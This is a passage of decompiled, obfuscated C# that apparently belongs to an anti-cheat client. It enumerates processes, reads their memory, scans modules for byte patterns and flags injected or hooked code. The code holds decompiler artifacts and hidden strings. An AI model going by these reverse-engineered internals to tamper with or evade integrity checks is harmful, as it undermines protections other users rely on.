				foreach (string extension in array2)
				{
					string text2 = Path.ChangeExtension(path, extension);
					try
					{
						if (File.Exists(text2))
						{
							this.gclass51_0.List_1[num].UInt32_0 |= 1U;
							GClass41 gclass2 = this.filestream(text2);
							if (gclass2 == null)
							{
								this.gclass51_0.List_1[num].UInt32_0 |= 4U;
							}
							else
							{
								gclass2.Int64_0 = this.gclass51_0.List_1[num].Int64_0;
								this.gclass51_0.List_1[num].UInt32_0 |= 2U;
							}
						}
						goto IL_375;
					}
					catch (Exception ex)
					{
						this.gclass51_0.List_1[num].UInt32_0 |= 8U;
						this.AddToErrorLog(GEnum22.const_21, ex.ToString());
						goto IL_375;
					}
					break;
					IL_375:;
				}
			}
			num++;
		}
		stopwatch.Stop();
		stopwatch.Reset();
		stopwatch.Start();
		num = 0;
		while (num < this.gclass51_0.List_1.Count && !this.SafeGetBool())
		{
			this.gclass51_0.List_1[num].method_3();
			num++;
		}
		stopwatch.Stop();
		stopwatch.Reset();
	}

	// Token: 0x06000628 RID: 1576 RVA: 0x0005F350 File Offset: 0x0005D550
	private void check_pid_main_stopwatch(Process process_1)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		this.LogModuleChanges(Process.GetCurrentProcess(), GEnum48.const_5);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_34, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.method_12();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_30, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.gclass51_0.String_6 = this.RetrieveStringValueWithFallbacks();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_25, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		string text = this.ScanHLProcess();
		if (text == null)
		{
			this.gclass51_0.GEnum23_0 |= GEnum23.const_2;
		}
		else
		{
			this.gclass51_0.String_14 = text;
		}
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_29, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.CollectFileInfoFromPaths();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_22, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.CollectFileDataMatchingPatterns();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_12, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.gclass51_0.String_4 = MAIN.TryHttpConnect();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_4, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.enum_process(process_1);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_24, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.SanitizeDirectoryObjects();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_3, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.regex_text();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_2, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.check_registry_intact_flag_detect();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_35, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.UpdateListWithItem();
		this.gclass51_0.string_15 = GClass49.GetProcessNameFromMemory(process_1.Id);
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_5, stopwatch);
		stopwatch.Reset();
		stopwatch.Start();
		this.ProcessExternalFileConfigurations(GEnum57.const_1);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_0, stopwatch);
		stopwatch.Reset();
		if (!this.SafeGetBool())
		{
			stopwatch.Start();
			this.ProcessExternalFileConfigurations(GEnum57.const_0);
			this.IncrementCounterAndInvokeUpdate();
			stopwatch.Stop();
			this.RecordStopwatchTime(GEnum49.const_1, stopwatch);
			stopwatch.Reset();
			this.SafeGetBool();
			return;
		}
	}

	// Token: 0x06000629 RID: 1577 RVA: 0x0005F658 File Offset: 0x0005D858
	private void getprocess(Process process_1)
	{
		if (process_1 == null)
		{
			this.SafeSetBool();
			return;
		}
		Stopwatch stopwatch = new Stopwatch();
		try
		{
			this.gclass51_0.long_0 = this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_1, process_1.MainModule.FileName, null, GEnum51.const_2);
		}
		catch
		{
		}
		try
		{
			Process currentProcess = Process.GetCurrentProcess();
			this.gclass51_0.long_1 = this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_3, currentProcess.MainModule.FileName, null, GEnum51.const_2);
		}
		catch
		{
		}
		stopwatch.Start();
		this.LogModuleChanges(process_1, GEnum48.const_1);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_19, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.processmodules(this.process_0);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_14, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.processmodules2(this.process_0);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_15, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.QueryProcessInfo(Process.GetCurrentProcess(), out this.gclass51_0.long_4);
		this.IncrementCounterAndInvokeUpdate();
		if (this.SafeGetBool())
		{
			stopwatch.Stop();
			return;
		}
		this.QueryProcessInfo(this.process_0, out this.gclass51_0.long_3);
		this.IncrementCounterAndInvokeUpdate();
		if (this.SafeGetBool())
		{
			stopwatch.Stop();
			return;
		}
		stopwatch.Start();
		this.CheckAndTrackProcesses();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_28, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.validate_checks_generic_detection(process_1);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_26, stopwatch);
		stopwatch.Reset();
		if (!this.SafeGetBool())
		{
			stopwatch.Start();
			try
			{
				this.gclass51_0.GClass55_0 = new GClass55(process_1);
			}
			catch
			{
				this.gclass51_0.GClass55_0 = null;
			}
			this.UpdateListWithItem();
			stopwatch.Stop();
			this.RecordStopwatchTime(GEnum49.const_31, stopwatch);
			return;
		}
	}

	// Token: 0x0600062A RID: 1578 RVA: 0x0005F8A0 File Offset: 0x0005DAA0
	public bool SafeGetBool()
	{
		object obj = MAIN.object_2;
		bool result;
		lock (obj)
		{
			result = this.bool_1;
		}
		return result;
	}

	// Token: 0x0600062B RID: 1579 RVA: 0x0005F8E4 File Offset: 0x0005DAE4
	public void SafeSetBool()
	{
		object obj = MAIN.object_2;
		lock (obj)
		{
			this.bool_1 = true;
		}
	}

	// Token: 0x0600062C RID: 1580 RVA: 0x0005F924 File Offset: 0x0005DB24
	private void flag_process_stop_watch(Process process_1)
	{
		if (process_1 == null)
		{
			this.SafeSetBool();
			return;
		}
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		this.get_process_list();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_27, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		if (!this.InspectProcessMemoryRegions(process_1, false, this.gclass51_0.Boolean_0))
		{
			stopwatch.Stop();
			this.SafeSetBool();
			return;
		}
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_20, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		if (!this.QueryThreadStatistics(process_1, GEnum48.const_1, this.gclass51_0.Boolean_0, GEnum23.const_0, ref this.gclass51_0.int_0, ref this.gclass51_0.double_0, ref this.gclass51_0.double_1))
		{
			stopwatch.Stop();
			this.SafeSetBool();
			return;
		}
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_21, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.ScanAndLogExecutableMemoryRegions(process_1, false);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_23, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.process_string_check(process_1, Class14.String_132, null, Class14.String_141, true);
		this.IncrementCounterAndInvokeUpdate();
		if (this.SafeGetBool())
		{
			stopwatch.Stop();
			return;
		}
		this.process_string_check(process_1, Class14.String_30, null, Class14.String_141, true);
		this.IncrementCounterAndInvokeUpdate();
		if (this.SafeGetBool())
		{
			stopwatch.Stop();
			return;
		}
		this.process_string_check(process_1, Class14.String_176, null, Class14.String_45, true);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_17, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.check_all_modules(process_1);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_18, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		if (!this.InspectMemoryForInjection(process_1))
		{
			stopwatch.Stop();
			this.SafeSetBool();
			return;
		}
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_33, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		this.UpdateListWithItem();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.AnalyzeAndHandleFiles();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_16, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return;
		}
		stopwatch.Start();
		this.UpdateAccessRightsForPaths();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_32, stopwatch);
		stopwatch.Reset();
		this.SafeGetBool();
	}

	// Token: 0x0600062D RID: 1581 RVA: 0x0005FBDC File Offset: 0x0005DDDC
	private void setTrue(object sender, EventArgs e)
	{
		this.SafeSetBool();
	}

	// Token: 0x0600062E RID: 1582 RVA: 0x0005FBF0 File Offset: 0x0005DDF0
	public bool process_string_check(Process process_1, string string_6, string string_7 = null, string[] string_8 = null, bool bool_3 = false)
	{
		IntPtr intPtr = IntPtr.Zero;
		bool result = false;
		if (process_1 == null || string_6 == null)
		{
			return result;
		}
		string moduleName = process_1.MainModule.ModuleName;
		ProcessModule processModule = GClass49.FindProcessModule(process_1, string_6, string_7, GClass49.GEnum43.const_1);
		if (processModule == null)
		{
			return result;
		}
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
			if (intPtr == IntPtr.Zero)
			{
				return result;
			}
			GClass14[] array = new GClass17(intPtr, processModule.BaseAddress, GEnum15.const_2).GClass14_0;
			if (array == null)
			{
				return result;
			}
			int i;
			if (string_8 != null)
			{
				List<GClass14> list = new List<GClass14>();
				for (i = 0; i < string_8.Length; i++)
				{
					string b = string_8[i].ToLowerInvariant();
					foreach (GClass14 gclass in array)
					{
						if (gclass.String_0 != null && gclass.String_0.ToLowerInvariant() == b)
						{
							list.Add(gclass);
							break;
						}
					}
				}
				array = list.ToArray();
			}
			long num = processModule.BaseAddress.ToInt64();
			long num2 = processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize;
			GEnum21 genum = GEnum21.const_11;
			if (bool_3)
			{
				genum |= GEnum21.const_21;
			}
			GClass14[] array2 = array;
			i = 0;
			while (i < array2.Length)
			{
				GClass14 gclass2 = array2[i];
				long num3;
				try
				{
					num3 = (long)((ulong)gclass2.UInt32_0 + (ulong)num);
					goto IL_273;
				}
				catch
				{
					num3 = (long)((ulong)gclass2.UInt32_0);
					goto IL_273;
				}
				goto IL_16C;
				IL_268:
				i++;
				continue;
				IL_16C:
				if (num3 < num2)
				{
					goto IL_268;
				}
				IL_175:
				string text = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, (IntPtr)((long)((ulong)gclass2.UInt32_0)));
				GEnum48 genum48_;
				if (text != null)
				{
					genum48_ = GEnum48.const_1;
				}
				else
				{
					text = GClass45.GetMappedFileNameInfo(intPtr, (IntPtr)((long)((ulong)gclass2.UInt32_0)));
					if (text == null)
					{
						text = string.Empty;
					}
					genum48_ = GEnum48.const_4;
				}
				long long_;
				if (text != null && text.Length > 0)
				{
					long_ = this.HandleFileAccessRights(genum, genum48_, text.ToString(), null, GEnum51.const_2);
				}
				else
				{
					long_ = -1L;
				}
				string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, (IntPtr)((long)((ulong)gclass2.UInt32_0)));
				this.LogEvent(genum, string.Concat(new object[]
				{
					string_6,
					<Module>.DeserealizeFromByteArrayV2_1<string>(1214359125U),
					gclass2.String_0 ?? Class14.String_208,
					<Module>.DeserealizeFromByteArrayV2_1<string>(3037699330U),
					gclass2.UInt32_0,
					<Module>.DeserializeFromByteArray3<string>(4083566554U),
					memoryRegionInfo
				}), -1, long_, GEnum23.const_0);
				goto IL_268;
				IL_273:
				if (num3 >= num)
				{
					goto IL_16C;
				}
				goto IL_175;
			}
			result = true;
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_10, ex.ToString());
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
		return result;
	}

	// Token: 0x0600062F RID: 1583
	public static IntPtr PerformAOBScan(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, byte[] byte_2, string string_6, bool bool_3, int int_2, int int_3, uint uint_0)
	{
		if (!(intptr_0 == IntPtr.Zero))
		{
			if (int_3 != 4)
			{
				if (int_3 != 8)
				{
					goto IL_289;
				}
			}
			GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
			GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
			uint num = 4096U;
			GClass45.GetSystemInfo(ref gstruct2);
			if (gstruct2.uint_1 > 0U)
			{
				num = gstruct2.uint_1;
			}
			IntPtr intPtr = intptr_1;
			IntPtr intPtr2 = (IntPtr)(intptr_1.ToInt64() + intptr_2.ToInt64());
			IntPtr intPtr3 = IntPtr.Zero;
			uint num2 = 0U;
			byte[] array = new byte[num];
			while (intPtr.ToInt64() < intPtr2.ToInt64())
			{
				if (GClass45.VirtualQueryEx(intptr_0, intPtr, out gstruct, Marshal.SizeOf(gstruct)) <= 0 || gstruct.intptr_0.ToInt64() == 0L || gstruct.intptr_2.ToInt64() == 0L)
				{
					IL_273:
					while (intPtr.ToInt64() < intPtr2.ToInt64())
					{
					}
					return IntPtr.Zero;
				}
				IntPtr intPtr4 = (IntPtr)(gstruct.intptr_0.ToInt64() + gstruct.intptr_2.ToInt64());
				if (!GClass49.CanExecuteCodeInMemory(gstruct))
				{
					intPtr = intPtr4;
				}
				else
				{
					if (uint_0 == 0U || (gstruct.uint_2 & uint_0) == uint_0)
					{
						IntPtr intptr_3 = intPtr;
						IntPtr intPtr5 = intPtr;
						uint num3 = num;
						for (;;)
						{
							if (intptr_3.ToInt64() + (long)((ulong)num3) >= intPtr4.ToInt64())
							{
								num3 = (uint)(intPtr4.ToInt64() - intptr_3.ToInt64());
							}
							if (!GClass45.ReadProcessMemory(intptr_0, intptr_3, array, num3, ref num2) || num2 <= 0U)
							{
								goto IL_257;
							}
							if (num2 < num3)
							{
								Array.Clear(array, (int)num2, array.Length - (int)num2);
							}
							int num4 = Class15.SearchBytePattern(array, byte_2, string_6, 0, (int)num2);
							if (num4 > -1)
							{
								num4 += int_2;
								if (int_3 != 4)
								{
									if (int_3 == 8)
									{
										intPtr3 = (IntPtr)BitConverter.ToInt64(array, num4);
										if (!bool_3)
										{
											intPtr3 = (IntPtr)(intptr_1.ToInt64() + intPtr3.ToInt64());
										}
									}
									else
									{
										intPtr3 = (IntPtr)(intptr_3.ToInt64() + intPtr3.ToInt64());
									}
								}
								else
								{
									intPtr3 = (IntPtr)BitConverter.ToInt32(array, num4);
									if (!bool_3)
									{
										intPtr3 = (IntPtr)(intptr_1.ToInt64() + intPtr3.ToInt64());
									}
								}
								if (GClass49.IsExecutableRegion(intptr_0, intPtr3))
								{
									break;
								}
							}
							intPtr5 = (IntPtr)(intPtr5.ToInt64() + (long)((ulong)num3));
							intptr_3 = (IntPtr)(intPtr5.ToInt64() - (long)byte_2.Length);
							if ((ulong)num3 == (ulong)((long)byte_2.Length))
							{
								goto Block_18;
							}
							if (intptr_3.ToInt64() >= intPtr4.ToInt64())
							{
								goto IL_257;
							}
						}
						return intPtr3;
						IL_257:
						intPtr = intPtr4;
						continue;
						Block_18:
						goto IL_257;
					}
					intPtr = intPtr4;
				}
			}
			goto IL_273;
		}
		IL_289:
		return IntPtr.Zero;
	}

	// Token: 0x06000630 RID: 1584 RVA: 0x000601A0 File Offset: 0x0005E3A0
	public bool check_all_modules(Process process_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		bool result = false;
		if (process_1 != null && !process_1.HasExited)
		{
			try
			{
				intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
				if (intPtr == IntPtr.Zero)
				{
					return result;
				}
				List<GClass53> list = new List<GClass53>
				{
					new GClass53(Class14.Byte_55, Class14.String_203, Class14.int_91),
					new GClass53(Class14.Byte_64, Class14.String_233, Class14.int_2),
					new GClass53(Class14.Byte_31, Class14.String_149, Class14.int_137),
					new GClass53(Class14.Byte_41, Class14.String_59, Class14.int_25),
					new GClass53(Class14.Byte_48, Class14.String_39, Class14.int_314),
					new GClass53(Class14.Byte_40, Class14.String_85, Class14.int_19),
					new GClass53(Class14.Byte_0, Class14.String_103, Class14.int_100)
				};
				List<GClass53> list2 = new List<GClass53>
				{
					new GClass53(Class14.Byte_62, Class14.String_225, Class14.int_217),
					new GClass53(Class14.Byte_39, Class14.String_135, Class14.int_106),
					new GClass53(Class14.Byte_11, Class14.String_15, Class14.int_114),
					new GClass53(Class14.Byte_20, Class14.String_40, Class14.int_287),
					new GClass53(Class14.Byte_61, Class14.String_113, Class14.int_333),
					new GClass53(Class14.Byte_52, Class14.String_142, Class14.int_26),
					new GClass53(Class14.Byte_59, Class14.String_4, Class14.int_23),
					new GClass53(Class14.Byte_57, Class14.String_130, Class14.int_31),
					new GClass53(Class14.Byte_58, Class14.String_26, Class14.int_346),
					new GClass53(Class14.Byte_3, Class14.String_232, Class14.int_187),
					new GClass53(Class14.Byte_22, Class14.String_25, Class14.int_364)
				};
				List<GClass53> list3 = new List<GClass53>
				{
					new GClass53(Class14.Byte_34, Class14.String_31, Class14.int_76),
					new GClass53(Class14.Byte_51, Class14.String_21, Class14.int_89),
					new GClass53(Class14.Byte_26, Class14.String_90, Class14.int_220),
					new GClass53(Class14.Byte_35, Class14.String_144, Class14.int_83),
					new GClass53(Class14.Byte_28, Class14.String_151, Class14.int_304)
				};
				ProcessModule[] array = new ProcessModule[]
				{
					GClass49.GetModuleByName(process_1, Class14.String_235),
					GClass49.GetModuleByName(process_1, Class14.String_116),
					GClass49.GetModuleByName(process_1, Class14.String_34),
					process_1.MainModule
				};
				IntPtr intPtr2 = IntPtr.Zero;
				IntPtr intPtr3 = IntPtr.Zero;
				IntPtr intPtr4 = IntPtr.Zero;
				bool flag = false;
				bool flag2 = false;
				bool flag3 = false;
				Dictionary<GEnum53, bool> dictionary = new Dictionary<GEnum53, bool>
				{
					{
						GEnum53.const_33,
						true
					},
					{
						GEnum53.const_14,
						false
					},
					{
						GEnum53.const_3,
						false
					},
					{
						GEnum53.const_19,
						false
					},
					{
						GEnum53.const_25,
						false
					},
					{
						GEnum53.const_34,
						false
					},
					{
						GEnum53.const_1,
						false
					},
					{
						GEnum53.const_2,
						false
					},
					{
						GEnum53.const_11,
						false
					},
					{
						GEnum53.const_39,
						false
					},
					{
						GEnum53.const_6,
						false
					},
					{
						GEnum53.const_7,
						false
					},
					{
						GEnum53.const_8,
						false
					},
					{
						GEnum53.const_4,
						true
					},
					{
						GEnum53.const_20,
						true
					},
					{
						GEnum53.const_26,
						true
					},
					{
						GEnum53.const_35,
						true
					},
					{
						GEnum53.const_38,
						true
					}
				};
				Dictionary<GEnum56, bool> dictionary2 = new Dictionary<GEnum56, bool>
				{
					{
						GEnum56.const_25,
						true
					},
					{
						GEnum56.const_23,
						true
					}
				};
				Dictionary<GEnum54, bool> dictionary3 = new Dictionary<GEnum54, bool>
				{
					{
						GEnum54.const_69,
						true
					},
					{
						GEnum54.const_11,
						true
					},
					{
						GEnum54.const_20,
						true
					},
					{
						GEnum54.const_5,
						true
					}
				};
				foreach (ProcessModule processModule in array)
				{
					if (processModule != null)
					{
						long num = processModule.BaseAddress.ToInt64();
						long num2 = processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize;
						if (!flag)
						{
							foreach (GClass53 gclass in list2)
							{
								intPtr2 = MAIN.PerformAOBScan(intPtr, processModule.BaseAddress, (IntPtr)processModule.ModuleMemorySize, gclass.Byte_0, gclass.String_0, true, gclass.Int32_0[0], 4, 0U);
								if (intPtr2 != IntPtr.Zero)
								{
									int[] array3 = GClass60.smethod_0(intPtr, intPtr2);
									if (array3 != null)
									{
										flag = true;
										foreach (KeyValuePair<GEnum53, bool> keyValuePair in dictionary)
										{
											long num3 = (long)array3[(int)keyValuePair.Key];
											if ((num3 < num || num3 >= num2) && GClass49.IsMemoryProtected(intPtr, (IntPtr)num3))
											{
												GEnum21 genum = GEnum21.const_12;
												if (keyValuePair.Value)
												{
													genum |= GEnum21.const_21;
												}
												string text = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, (IntPtr)num3);
												GEnum48 genum48_;
												if (text != null)
												{
													genum48_ = GEnum48.const_1;
												}
												else
												{
													text = GClass45.GetMappedFileNameInfo(intPtr, (IntPtr)num3);
													if (text == null)
													{
														text = string.Empty;
													}
													genum48_ = GEnum48.const_4;
												}
												long long_;
												if (text != null && text.Length > 0)
												{
													long_ = this.HandleFileAccessRights(genum, genum48_, text.ToString(), null, GEnum51.const_2);
												}
												else
												{
													long_ = -1L;
												}
												string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, (IntPtr)num3);
												string string_ = string.Format(<Module>.DeserializeFromByteArrayV2<string>(865511087U), Class14.String_33, (int)keyValuePair.Key, memoryRegionInfo);
												this.LogEvent(genum, string_, -1, long_, GEnum23.const_0);
											}
										}
										break;
									}
									intPtr2 = IntPtr.Zero;
								}
							}
						}
						if (!flag2)
						{
							foreach (GClass53 gclass2 in list)
							{
								intPtr3 = MAIN.PerformAOBScan(intPtr, processModule.BaseAddress, (IntPtr)processModule.ModuleMemorySize, gclass2.Byte_0, gclass2.String_0, true, gclass2.Int32_0[0], 4, 0U);
								if (intPtr3 != IntPtr.Zero)
								{
									int[] array4 = GClass61.smethod_0(intPtr, intPtr3);
									if (array4 != null)
									{
										flag2 = true;
										foreach (KeyValuePair<GEnum54, bool> keyValuePair2 in dictionary3)
										{
											long num3 = (long)array4[(int)keyValuePair2.Key];
											if ((num3 < num || num3 >= num2) && GClass49.IsMemoryProtected(intPtr, (IntPtr)num3))
											{
												GEnum21 genum = GEnum21.const_12;
												if (keyValuePair2.Value)
												{
													genum |= GEnum21.const_21;
												}
												string text2 = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, (IntPtr)num3);
												GEnum48 genum48_;
												if (text2 == null)
												{
													text2 = GClass45.GetMappedFileNameInfo(intPtr, (IntPtr)num3);
													if (text2 == null)
													{
														text2 = string.Empty;
													}
													genum48_ = GEnum48.const_4;
												}
												else
												{
													genum48_ = GEnum48.const_1;
												}
												long long_;
												if (text2 != null && text2.Length > 0)
												{
													long_ = this.HandleFileAccessRights(genum, genum48_, text2.ToString(), null, GEnum51.const_2);
												}
												else
												{
													long_ = -1L;
												}
												string memoryRegionInfo2 = GClass49.GetMemoryRegionInfo(process_1, (IntPtr)num3);
												string string_2 = string.Format(<Module>.DeserializeFromByteArray<string>(3871338069U), Class14.String_75, (int)keyValuePair2.Key, memoryRegionInfo2);
												this.LogEvent(genum, string_2, -1, long_, GEnum23.const_0);
											}
										}
										break;
									}
									intPtr3 = IntPtr.Zero;
								}
							}
						}
						if (!flag3)
						{
							foreach (GClass53 gclass3 in list3)
							{
								intPtr4 = MAIN.PerformAOBScan(intPtr, processModule.BaseAddress, (IntPtr)processModule.ModuleMemorySize, gclass3.Byte_0, gclass3.String_0, true, gclass3.Int32_0[0], 4, 0U);
								if (intPtr4 != IntPtr.Zero)
								{
									int[] array5 = GClass63.smethod_0(intPtr, intPtr4);
									if (array5 != null)
									{
										flag3 = true;
										foreach (KeyValuePair<GEnum56, bool> keyValuePair3 in dictionary2)
										{
											long num3 = (long)array5[(int)keyValuePair3.Key];
											if ((num3 < num || num3 >= num2) && GClass49.IsMemoryProtected(intPtr, (IntPtr)num3))
											{
												GEnum21 genum = GEnum21.const_12;
												if (keyValuePair3.Value)
												{
													genum |= GEnum21.const_21;
												}
												string text3 = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, (IntPtr)num3);
												GEnum48 genum48_;
												if (text3 != null)
												{
													genum48_ = GEnum48.const_1;
												}
												else
												{
													text3 = GClass45.GetMappedFileNameInfo(intPtr, (IntPtr)num3);
													if (text3 == null)
													{
														text3 = string.Empty;
													}
													genum48_ = GEnum48.const_4;
												}
												long long_;
												if (text3 != null && text3.Length > 0)
												{
													long_ = this.HandleFileAccessRights(genum, genum48_, text3.ToString(), null, GEnum51.const_2);
												}
												else
												{
													long_ = -1L;
												}
												string memoryRegionInfo3 = GClass49.GetMemoryRegionInfo(process_1, (IntPtr)num3);
												string string_3 = string.Format(<Module>.DeserializeFromByteArray2<string>(1220127158U), Class14.String_131, (int)keyValuePair3.Key, memoryRegionInfo3);
												this.LogEvent(genum, string_3, -1, long_, GEnum23.const_0);
											}
										}
										break;
									}
									intPtr4 = IntPtr.Zero;
								}
							}
						}
					}
				}
				if (!flag)
				{
					this.AddToErrorLog(GEnum22.const_1, <Module>.DeserializeFromByteArray2<string>(3165454329U));
				}
				if (!flag2)
				{
					this.AddToErrorLog(GEnum22.const_2, <Module>.DeserializeFromByteArray3<string>(423071921U));
				}
				if (!flag3)
				{
					this.AddToErrorLog(GEnum22.const_9, <Module>.DeserializeFromByteArrayV2<string>(2800123294U));
				}
				result = true;
			}
			catch (Exception ex)
			{
				this.AddToErrorLog(GEnum22.const_8, ex.ToString());
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					GClass45.CloseHandle(intPtr);
				}
			}
			return result;
		}
		return result;
	}

	// Token: 0x06000631 RID: 1585 RVA: 0x00060C50 File Offset: 0x0005EE50
	private void get_process_list()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string text = null;
			int num = 0;
			while (num < processes.Length && !this.SafeGetBool())
			{
				try
				{
					if (processes[num].Id >= 4)
					{
						this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_3, processes[num].MainModule.FileName, new DateTime?(processes[num].StartTime), GEnum51.const_2);
					}
				}
				catch (InvalidOperationException)
				{
				}
				catch (Win32Exception)
				{
					if (GClass49.TryGetFullProcessImageName(processes[num], out text) && text != null)
					{
						this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_3, text, null, GEnum51.const_1);
					}
				}
				catch
				{
				}
				num++;
			}
		}
		catch
		{
			this.SafeSetBool();
		}
	}

	// Token: 0x06000632 RID: 1586 RVA: 0x00060D1C File Offset: 0x0005EF1C
	private void CheckAndTrackProcesses()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			while (num < processes.Length && !this.SafeGetBool())
			{
				try
				{
					if (processes[num].Id >= 4)
					{
						Process processInformation = GClass49.GetProcessInformation(processes[num]);
						if (processInformation != null && processInformation.Id == this.process_0.Id)
						{
							long num2 = this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_3, processes[num].MainModule.FileName, new DateTime?(processes[num].StartTime), GEnum51.const_2);
							if (num2 != -1L)
							{
								if (this.gclass51_0.List_11.IndexOf(num2) == -1)
								{
									this.gclass51_0.List_11.Add(num2);
								}
							}
						}
					}
				}
				catch
				{
				}
				num++;
			}
		}
		catch (Exception ex)
		{
